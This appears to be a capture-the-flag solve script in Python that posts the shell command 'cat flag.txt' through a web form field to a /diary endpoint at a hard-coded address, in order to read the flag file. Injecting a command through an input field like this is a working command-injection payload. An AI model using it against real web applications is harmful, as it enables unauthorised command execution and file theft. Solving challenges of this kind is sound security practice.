import requests

url = "http://157.66.55.21:8303/diary"

body = {"letters": "cat flag.txt"}

response = requests.post(url, data=body)

print(response.text)
